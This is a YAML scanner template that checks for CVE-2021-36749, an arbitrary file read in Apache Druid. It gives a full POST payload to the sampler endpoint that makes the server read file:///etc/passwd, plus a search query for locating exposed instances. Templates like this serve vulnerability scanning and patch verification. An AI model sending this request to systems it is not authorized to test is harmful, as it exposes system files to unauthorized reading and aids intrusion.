name: Apache Druid Abritrary File Read CVE-2021-36749
manual: true
query: title="Apache Druid"
transport: http
rules:
  r0:
    request:
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Accept: application/json, text/plain, */*
        Content-Type: application/json;charset=UTF-8
      body: '{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/passwd"]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"2010-01-01T00:00:00Z"}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}'
    expression: response.status == 200 && response.body.bcontains(b"root:x:")
expression: r0()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-36749
  - https://www.cvedetails.com/cve/CVE-2021-36749
  - https://github.com/BrucessKING/CVE-2021-36749
  - https://mp.weixin.qq.com/s/1iGsy2KpiijihtJ3M2Tdzw
  description: Apache Druid is a real-time database to power modern analytics applications.
  tags: fileread
